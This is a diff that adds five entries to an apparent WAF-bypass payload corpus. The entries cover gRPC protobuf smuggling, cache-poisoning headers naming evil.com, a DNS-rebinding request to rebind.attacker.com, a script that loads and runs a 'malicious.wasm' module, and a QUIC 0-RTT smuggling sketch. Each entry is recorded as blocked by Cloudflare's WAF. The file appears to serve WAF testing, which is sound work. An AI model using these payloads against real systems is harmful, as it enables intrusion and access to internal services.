@@ -2,7 +2,7 @@
   "category": "modern_bypasses",
   "subcategory": "2025_2026_techniques",
   "description": "Cutting-edge WAF bypass techniques from 2025-2026 research",
-  "count": 45,
+  "count": 50,
   "payloads": [
     {
       "id": "http2-smuggling-001",
@@ -528,6 +528,66 @@
       "description": "Combined HTTP/2 + Multipart + JSON + Unicode + SSTI bypass",
       "technique": "Multi-layer evasion",
       "source": "Advanced bypass combination 2025",
+      "tested_against": ["cloudflare_waf"],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "grpc-001",
+      "category": "grpc_bypass",
+      "subcategory": "protobuf_smuggling",
+      "payload": "POST /grpc.service/Method HTTP/2\nContent-Type: application/grpc\ngrpc-encoding: gzip\n\n[compressed protobuf with malicious payload]",
+      "description": "gRPC protobuf smuggling - WAFs often don't inspect binary protobuf",
+      "technique": "Protocol buffer exploitation",
+      "source": "gRPC security research 2025",
+      "tested_against": ["cloudflare_waf"],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "server-timing-001",
+      "category": "timing_attack",
+      "subcategory": "cache_poisoning",
+      "payload": "GET /api/data HTTP/1.1\nX-Forwarded-Host: evil.com\nX-Original-URL: /admin\nX-Rewrite-URL: /admin",
+      "description": "Cache poisoning via timing headers to bypass WAF on cached responses",
+      "technique": "Server-Timing header abuse",
+      "source": "Cache poisoning research 2026",
+      "tested_against": ["cloudflare_waf"],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "dns-rebinding-001",
+      "category": "dns_rebinding",
+      "subcategory": "ssrf_bypass",
+      "payload": "GET http://rebind.attacker.com/internal-api HTTP/1.1\nHost: rebind.attacker.com\n\n",
+      "description": "DNS rebinding to bypass SSRF protections - domain resolves to internal IP after initial check",
+      "technique": "Time-of-check time-of-use (TOCTOU)",
+      "source": "DNS rebinding attacks 2025",
+      "tested_against": ["cloudflare_waf"],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "wasm-001",
+      "category": "wasm_bypass",
+      "subcategory": "client_side_execution",
+      "payload": "<script>\nWebAssembly.instantiateStreaming(fetch('/malicious.wasm'))\n  .then(obj => obj.instance.exports.exploit());\n</script>",
+      "description": "WebAssembly to execute malicious code client-side, bypassing text-based WAF inspection",
+      "technique": "WASM binary execution",
+      "source": "WebAssembly security 2026",
+      "tested_against": ["cloudflare_waf"],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "quic-001",
+      "category": "quic_bypass",
+      "subcategory": "http3_smuggling",
+      "payload": "HTTP/3 QUIC stream with 0-RTT data:\nEarly data: GET /admin HTTP/3\n\nActual request: GET /public HTTP/3",
+      "description": "HTTP/3 QUIC 0-RTT replay attack to smuggle requests",
+      "technique": "QUIC 0-RTT exploitation",
+      "source": "HTTP/3 security research 2026",
       "tested_against": ["cloudflare_waf"],
       "success_rate": 0.0,
       "blocked": true
